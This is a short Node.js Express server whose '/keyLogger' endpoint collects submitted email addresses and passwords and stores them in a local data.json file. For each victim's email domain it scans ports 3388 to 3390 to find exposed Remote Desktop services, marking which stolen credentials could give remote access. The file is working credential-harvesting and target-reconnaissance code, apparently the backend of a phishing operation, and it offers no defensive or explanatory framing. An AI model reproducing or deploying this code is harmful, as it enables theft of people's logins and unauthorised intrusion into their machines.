const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();

const { promisify } = require('util');
const net = require('net');

const startPort = 3388; // Start port number of the range to scan
const endPort = 3390; // End port number of the range to scan

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/keyLogger', async (req, res) => {
  // Parse Email into username and domain
  const [username, domain] = req.body.Email.split('@');

  // Create a data object with the data
  const data = {
    username: username,
    domain: domain,
    password: req.body.Password
  };

  // Check if the Remote Desktop Protocol is enabled
  [data.rdp_enabled, data.rdp_port] = await checkRdpService(domain);

  // Check if the file exists
  if (!fs.existsSync('data.json')) {
    // If the file doesn't exist, create it and add the records array
    fs.writeFile('data.json', JSON.stringify({ records: [data] }), (err) => {
      if (err) {
        console.error(err);
        res.status(500).send('Error creating data file');
      }
    });
  }
  else {
    fs.readFile('data.json', (err, fileData) => {
      if (err) {
        console.error(err);
        res.status(500).send('Error reading data');
      } else {
        const json = JSON.parse(fileData);

        // Add the data to the records array
        json.records.push(data);

        // Write the updated data to the data.json file
        fs.writeFile('data.json', JSON.stringify(json), (err) => {
          if (err) {
            console.error(err);
            res.status(500).send('Error saving data');
          } else {
            res.status(200).send('Data saved successfully');
          }
        });
      }
    });
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});

// Create a function that given an domain name, checks if the Remote Desktop Protocol is enabled
const checkRdpService = async (domain) => {
  console.log(`Checking RDP service for ${domain}...`)
  for (let port = startPort; port <= endPort; port++) {
    try {
      const socket = new net.Socket();
      const connect = promisify(socket.connect.bind(socket));

      console.log(`Trying port ${port}...`)
      // Try to connect to the port, wait 5 seconds maximum
      await Promise.race([
        connect(port, domain),
        new Promise((resolve, reject) => {
          setTimeout(() => reject(new Error(`Connection timed out for port ${port}`)), 5000);
        }),
      ]);

      console.log(`RDP service is enabled for ${domain} on port ${port}`);
      socket.destroy();
      return [true, port];
    } catch (err) {
      // Ignore connection errors
    }
  }
  console.log(`RDP service is not enabled for ${domain}`);
  return [false, null];
};

